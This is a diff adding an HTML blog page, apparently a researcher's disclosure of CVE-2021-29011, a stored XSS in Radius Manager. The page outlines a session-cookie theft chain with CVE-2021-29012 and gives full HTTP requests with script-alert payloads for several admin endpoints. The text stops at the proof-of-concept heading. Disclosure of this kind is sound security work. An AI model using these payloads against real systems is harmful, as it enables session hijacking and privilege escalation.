@@ -1,0 +1,694 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        CVE-2021-29011 - XSS ::
+        1d8 blog — A simple theme for Hugo
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="CVE-2021-29011 (XSS)
+There are several features of the radius manager software that are vulnerable to cross-site scripting (xss). Successful exploitation requires that you have access to the Radius Management software web interface and be logged in or have an account with sufficient privileges for adding/editing certain items (such as adding users, access points, etc).
+This may be used as a means to elevate privileges when chained together with CVE-2021-29012 since a low-privilege account is required."
+/>
+<meta
+  name="keywords"
+  content=""
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://1d8.github.io/cves/cve_2021_29011/" />
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/style.css" />
+
+<link rel="stylesheet" href="https://1d8.github.io/style.css" />
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://1d8.github.io/img/apple-touch-icon-144-precomposed.png" />
+<link rel="shortcut icon" href="https://1d8.github.io/img/favicon.png" />
+
+
+<link href="/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="CVE-2021-29011 - XSS"/>
+<meta name="twitter:description" content="CVE-2021-29011 (XSS)
+There are several features of the radius manager software that are vulnerable to cross-site scripting (xss). Successful exploitation requires that you have access to the Radius Management software web interface and be logged in or have an account with sufficient privileges for adding/editing certain items (such as adding users, access points, etc).
+This may be used as a means to elevate privileges when chained together with CVE-2021-29012 since a low-privilege account is required."/>
+
+
+
+<meta property="og:title" content="CVE-2021-29011 - XSS" />
+<meta property="og:description" content="CVE-2021-29011 (XSS)
+There are several features of the radius manager software that are vulnerable to cross-site scripting (xss). Successful exploitation requires that you have access to the Radius Management software web interface and be logged in or have an account with sufficient privileges for adding/editing certain items (such as adding users, access points, etc).
+This may be used as a means to elevate privileges when chained together with CVE-2021-29012 since a low-privilege account is required." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://1d8.github.io/cves/cve_2021_29011/" /><meta property="article:section" content="cves" />
+
+<meta property="og:site_name" content="1d8 blog" />
+
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >1d8 blog</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/cves">CVEs</a></li>
+        
+      
+        
+          <li><a href="/publications">Publications</a></li>
+        
+      
+        
+          <li><a href="/writeups">Writeups</a></li>
+        
+      
+      
+      
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/cves">CVEs</a></li>
+      
+    
+      
+        <li><a href="/publications">Publications</a></li>
+      
+    
+      
+        <li><a href="/writeups">Writeups</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <article class="post">
+    <h1 class="post-title">CVE-2021-29011 - XSS</h1>
+    <div class="post-meta">
+      
+
+      
+
+
+      
+        <span class="post-read-time"
+          >— 7 min read</span
+        >
+      
+    </div>
+
+    
+
+    
+
+    <div class="post-content">
+      
+      <p>CVE-2021-29011 (XSS)</p>
+<p>There are several features of the radius manager software that are vulnerable to cross-site scripting (xss). Successful exploitation requires that you have access to the Radius Management software web interface and be logged in or have an account with sufficient privileges for adding/editing certain items (such as adding users, access points, etc).</p>
+<p>This may be used as a means to elevate privileges when chained together with CVE-2021-29012 since a low-privilege account is required. A potential attack scenario would be:</p>
+<ol>
+<li>
+<p>Insert malicious Javascript via the XSS vulnerability which will steal an admin user or higher privilege user&rsquo;s session cookie &amp; send this cookie back to an attacker-controlled server.</p>
+</li>
+<li>
+<p>Due to broken session management, this stolen cookie doesn&rsquo;t expire upon logging out so an attacker can use this session cookie to impersonate someone as long as the user they are attempting to impersonate is also logged in at the same time (more on this in the CVE-2021-29012 section).</p>
+</li>
+<li>
+<p>Now the attacker can make requests on behalf of a victim user (potentially an admin with) simply by changing the <em>Cookie</em> field in the HTTP request</p>
+</li>
+</ol>
+<p>Vulnerable endpoints include:</p>
+<ul>
+<li>
+<p>the description field when creating new <em>service plans</em> (/admin.php?cont=new_service)</p>
+</li>
+<li>
+<p>the address field when creating a new user account or when editing an existing user account (/admin.php?cont=new_user and /admin.php?cont=edit_user&amp;username=)</p>
+</li>
+<li>
+<p>the description field when editing an access point or adding a new access point (/admin.php?cont=edit_ap&amp;id= and /admin.php?cont=new_ap)</p>
+</li>
+<li>
+<p>the first or last name field or the address field when creating a new manager account (/admin.php?cont=new_manager and /admin.php?cont=edit_manager&amp;managername=)</p>
+</li>
+<li>
+<p>the name or descripton field when creating a new NAS (/admin.php?cont=new_nas and /admin.php?cont=edit_nas&amp;id=)</p>
+</li>
+</ul>
+<p>The following are the HTTP request fields which can exploit this vulnerability across the different listed endpoints:</p>
+<h3 id="adding-manager-account-request">
+  Adding Manager Account Request
+  <a href="#adding-manager-account-request" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">POST</span> /admin.php?cont=store_manager <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">radmandemo.dmasoftlab.com</span>
+User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span>
+Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
+Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
+Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
+Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">406</span>
+Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://radmandemo.dmasoftlab.com</span>
+DNT<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
+Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://radmandemo.dmasoftlab.com/admin.php?cont=new_manager</span>
+Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">PHPSESSID=1u7c5e6hnobson7n53vt7o3vq3; listusers_ordercol=username; listusers_ordertype=ASC; newuser_acctype=0; login_admin=admin; login_user=user; lstinv_trtype=0; lstinv_pmstatus=-1; lstinv_trusr=1; lstinv_trman=1; lstinv_paymode0=1; lstinv_paymode1=1; lstinv_paymode2=1; lstinv_paymode3=1; lstinv_paymode4=1; lstinv_paymode5=1; lstinv_paymode6=1; lstinv_paymode7=1; lstinv_paymode8=1; lstinv_paymode9=1; lstinv_paymode10=1; lstinv_paymode11=1; lstinv_paymode12=1; lstinv_paymode13=1</span>
+Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+Sec-GPC<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+
+enablemanager=1&amp;managername=script&amp;password1=admin&amp;password2=admin&amp;firstname=%3Cscript%3Ealert%28%22xss+1d8%22%29%3C%2Fscript%3E&amp;lastname=%3Cscript%3Ealert%28%22xss+1d8%22%29%3C%2Fscript%3E&amp;company=%3Cscript%3Ealert%28%22xss+1d8%22%29%3C%2Fscript%3E&amp;address=%3Cscript%3Ealert%28%22xss+1d8%22%29%3C%2Fscript%3E&amp;city=&amp;zip=&amp;country=&amp;state=&amp;phone=&amp;mobile=&amp;email=&amp;vatid=&amp;lang=English&amp;comment=&amp;Submit=Add+manager
+</code></pre></div><h3 id="adding-access-points">
+  Adding Access Points
+  <a href="#adding-access-points" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">POST</span> /admin.php?cont=store_ap <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">radmandemo.dmasoftlab.com</span>
+User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span>
+Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
+Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
+Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
+Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">190</span>
+Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://radmandemo.dmasoftlab.com</span>
+DNT<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
+Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://radmandemo.dmasoftlab.com/admin.php?cont=new_ap</span>
+Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">PHPSESSID=1u7c5e6hnobson7n53vt7o3vq3; listusers_ordercol=username; listusers_ordertype=ASC; newuser_acctype=0; login_admin=admin; login_user=user; lstinv_trtype=0; lstinv_pmstatus=-1; lstinv_trusr=1; lstinv_trman=1; lstinv_paymode0=1; lstinv_paymode1=1; lstinv_paymode2=1; lstinv_paymode3=1; lstinv_paymode4=1; lstinv_paymode5=1; lstinv_paymode6=1; lstinv_paymode7=1; lstinv_paymode8=1; lstinv_paymode9=1; lstinv_paymode10=1; lstinv_paymode11=1; lstinv_paymode12=1; lstinv_paymode13=1</span>
+Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+Sec-GPC<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+
+​enable=1&amp;name=name&amp;ip=192.168.1.254&amp;accessmode=0&amp;community=Name&amp;apiusername=Name&amp;apipassword=Name&amp;apiver=0&amp;description=%3Cscript%3Ealert%28%22xss+1d8%22%29%3C%2Fscript%3E&amp;Submit=Store+AP&amp;id=
+</code></pre></div><h3 id="adding-nas">
+  Adding NAS
+  <a href="#adding-nas" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">POST</span> /admin.php?cont=store_nas <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">radmandemo.dmasoftlab.com</span>
+User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span>
+Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
+Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
+Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
+Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">166</span>
+Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://radmandemo.dmasoftlab.com</span>
+DNT<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
+Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://radmandemo.dmasoftlab.com/admin.php?cont=new_nas</span>
+Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">PHPSESSID=1u7c5e6hnobson7n53vt7o3vq3; listusers_ordercol=username; listusers_ordertype=ASC; newuser_acctype=0; login_admin=admin; login_user=user; lstinv_trtype=0; lstinv_pmstatus=-1; lstinv_trusr=1; lstinv_trman=1; lstinv_paymode0=1; lstinv_paymode1=1; lstinv_paymode2=1; lstinv_paymode3=1; lstinv_paymode4=1; lstinv_paymode5=1; lstinv_paymode6=1; lstinv_paymode7=1; lstinv_paymode8=1; lstinv_paymode9=1; lstinv_paymode10=1; lstinv_paymode11=1; lstinv_paymode12=1; lstinv_paymode13=1</span>
+Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+Sec-GPC<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+
+name=Name&amp;nasip=192.168.1.198&amp;type=0&amp;secret=Name&amp;coamode=0&amp;apiusername=&amp;apipassword=&amp;apiver=0&amp;descr=%3Cscript%3Ealert%28%22xss+1d8%22%29%3C%2Fscript%3E&amp;Submit=Add+NAS
+</code></pre></div><h3 id="adding-service-plans">
+  Adding Service Plans
+  <a href="#adding-service-plans" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">POST</span> /admin.php?cont=store_service <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">radmandemo.dmasoftlab.com</span>
+User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span>
+Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
+Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
+Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">multipart/form-data; boundary=---------------------------408088260618922419663198838811</span>
+Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">6939</span>
+Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://radmandemo.dmasoftlab.com</span>
+DNT<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
+Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://radmandemo.dmasoftlab.com/admin.php?cont=new_service</span>
+Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">PHPSESSID=1u7c5e6hnobson7n53vt7o3vq3; listusers_ordercol=username; listusers_ordertype=ASC; newuser_acctype=0; login_admin=admin; login_user=user; lstinv_trtype=0; lstinv_pmstatus=-1; lstinv_trusr=1; lstinv_trman=1; lstinv_paymode0=1; lstinv_paymode1=1; lstinv_paymode2=1; lstinv_paymode3=1; lstinv_paymode4=1; lstinv_paymode5=1; lstinv_paymode6=1; lstinv_paymode7=1; lstinv_paymode8=1; lstinv_paymode9=1; lstinv_paymode10=1; lstinv_paymode11=1; lstinv_paymode12=1; lstinv_paymode13=1</span>
+Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+Sec-GPC<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;srvname&#34;
+
+&lt;script&gt;alert(&#34;xss 1d8&#34;)&lt;/script&gt;
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;descr&#34;
+
+&lt;script&gt;alert(&#34;xss 1d8&#34;)&lt;/script&gt;
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;enableservice&#34;
+
+1
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;srvtype&#34;
+
+0
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;downrate&#34;
+
+0
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;uprate&#34;
+
+0
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;policymapdl&#34;
+
+
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;policymapul&#34;
+
+
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;dlquota&#34;
+
+0
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;ulquota&#34;
+
+0
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;combquota&#34;
+
+0
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;timequota&#34;
+
+00:00:00
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;dlburstlimit&#34;
+
+0
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;ulburstlimit&#34;
+
+0
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;dlburstthreshold&#34;
+
+0
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;ulburstthreshold&#34;
+
+0
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;dlbursttime&#34;
+
+0
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;ulbursttime&#34;
+
+0
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;priority&#34;
+
+8
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;poolname&#34;
+
+
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;disnextsrvid&#34;
+
+-1
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;nextsrvid&#34;
+
+-1
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;dailynextsrvid&#34;
+
+-1
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;custattr&#34;
+
+
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;cmcfg&#34;
+
+
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;allowednases[]&#34;
+
+3
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;allowednases[]&#34;
+
+1
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;allowednases[]&#34;
+
+5
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;allowednases[]&#34;
+
+2
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;allowedmanagers[]&#34;
+
+admin
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;allowedmanagers[]&#34;
+
+manager1
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;unitprice&#34;
+
+0.000000
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;taxpercent&#34;
+
+11.00
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;unitpricegross&#34;
+
+0.000000
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;unitpricetax&#34;
+
+0.000000
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;unitpriceadd&#34;
+
+0.000000
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;unitpriceaddgross&#34;
+
+0.000000
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;unitpriceaddtax&#34;
+
+0.000000
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;timeaddmodeexp&#34;
+
+0
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;timeaddmodeonline&#34;
+
+0
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;trafficaddmode&#34;
+
+0
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;timeunitexp&#34;
+
+0
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;inittimeexp&#34;
+
+0
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;timebaseexp&#34;
+
+2
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;timeunitonline&#34;
+
+0
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;inittimeonline&#34;
+
+0
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;timebaseonline&#34;
+
+0
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;trafficunitdl&#34;
+
+0
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;initdl&#34;
+
+0
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;trafficunitul&#34;
+
+0
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;initul&#34;
+
+0
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;trafficunitcomb&#34;
+
+0
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;inittotal&#34;
+
+0
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;minamount&#34;
+
+1
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;addamount&#34;
+
+1
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;minamountadd&#34;
+
+1
+-----------------------------408088260618922419663198838811
+Content-Disposition: form-data; name=&#34;Submit&#34;
+
+Store service
+-----------------------------408088260618922419663198838811--
+</code></pre></div><h3 id="adding-user-accounts">
+  Adding User Accounts
+  <a href="#adding-user-accounts" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">POST</span> /user.php?cont=update_user <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">radmandemo.dmasoftlab.com</span>
+User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span>
+Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
+Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
+Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
+Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">240</span>
+Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://radmandemo.dmasoftlab.com</span>
+DNT<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
+Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://radmandemo.dmasoftlab.com/user.php?cont=edit_user</span>
+Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">PHPSESSID=1u7c5e6hnobson7n53vt7o3vq3; listusers_ordercol=username; listusers_ordertype=ASC; newuser_acctype=0; login_admin=admin; login_user=user; lstinv_trtype=0; lstinv_pmstatus=-1; lstinv_trusr=1; lstinv_trman=1; lstinv_paymode0=1; lstinv_paymode1=1; lstinv_paymode2=1; lstinv_paymode3=1; lstinv_paymode4=1; lstinv_paymode5=1; lstinv_paymode6=1; lstinv_paymode7=1; lstinv_paymode8=1; lstinv_paymode9=1; lstinv_paymode10=1; lstinv_paymode11=1; lstinv_paymode12=1; lstinv_paymode13=1</span>
+Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+Sec-GPC<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+
+firstname=%3Cscript%3Ealert%28%221d8%22%29%3C%2Fscript%3E&amp;lastname=n&amp;address=n&amp;city=Tampa&amp;zip=9&amp;country=United+States&amp;state=California&amp;phone=56574121&amp;mobile=875412151&amp;email=&amp;company=&amp;taxid=&amp;lang=English&amp;alertemail=1&amp;alertsms=1&amp;Submit=Submit
+</code></pre></div><h2 id="demo-videos">
+  Demo Videos
+  <a href="#demo-videos" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p>By inserting an alert(&ldquo;text&rdquo;); box in the fields listed above, we&rsquo;re able to exploit this vulnerability as seen in the following gifs:</p>
+<ul>
+<li>
+<p><a href="https://www.dropbox.com/s/h47gjpn291pthyc/ap-xss-2021-03-19_22.26.52.mkv?dl=0">Dropbox - ap-xss-2021-03-19_22.26.52.mkv</a></p>
+</li>
+<li>
+<p><a href="https://www.dropbox.com/s/ayxxt54tr8w25hv/manager-xss-2021-03-19_22.56.25.mkv?dl=0">Dropbox - manager-xss-2021-03-19_22.56.25.mkv</a></p>
+</li>
+<li>
+<p><a href="https://www.dropbox.com/s/wtowrw0e269tzs2/nas-xss-2021-03-19_21.57.53.mkv?dl=0">Dropbox - nas-xss-2021-03-19_21.57.53.mkv</a></p>
+</li>
+<li>
+<p><a href="https://www.dropbox.com/s/m6u2nou03tog4mv/service-plan-xss.mkv?dl=0">Dropbox - service-plan-xss.mkv</a></p>
+</li>
+<li>
+<p><a href="https://www.dropbox.com/s/0aszx4mwyzs4krp/storedxss-manageradd-2021-03-20_00.38.33.mkv?dl=0">Dropbox - storedxss-manageradd-2021-03-20_00.38.33.mkv</a></p>
+</li>
+<li>
+<p><a href="https://www.dropbox.com/s/brbm10vhfirs097/xss-2021-03-19_21.10.02.mkv?dl=0">Dropbox - xss-2021-03-19_21.10.02.mkv </a></p>
+</li>
+<li>
+<p><a href="https://www.dropbox.com/s/yzls7l7vrqq8ym9/xss2-2021-03-19_21.15.10.mkv?dl=0">Dropbox - xss2-2021-03-19_21.15.10.mkv</a></p>
+</li>
+</ul>
+<h1 id="chaining-cves-together">
+  Chaining CVEs Together
+  <a href="#chaining-cves-together" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+<p>This section details chaining together CVE-2021-29012 &amp; CVE-2021-29011 in order to take an admin&rsquo;s session cookie &amp; perform requests on their behalf.</p>
+<p>There are multiple fields that are vulnerable to cross-site scripting but I could only find 1 field (the access point description field) that could fit an entire script for extracting a cookie &amp; sending it off to an attacker for use in session hijacking.</p>
+<h2 id="tools-used">
+  Tools Used:
+  <a href="#tools-used" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<ol>
+<li>Ngrok &amp; Python&rsquo;s simple HTTP server to simulate an attacker&rsquo;s server receiving the session cookie</li>
+</ol>
+<h2 id="proof-of-concept">
+  Proof of Concept
+  <a href="#proof-of-concept" class="h-anchor" aria-hidden="true">#</a>
+</h2>
+<p>Once we place our script inside the Access Point&rsquo;s description, anytime a user lists the available access points, we will receive their session cookie on our server &amp; be able to impersonate them.</p>
+<h3 id="cross-site-scripting-xss">
+  Cross Site Scripting (XSS)
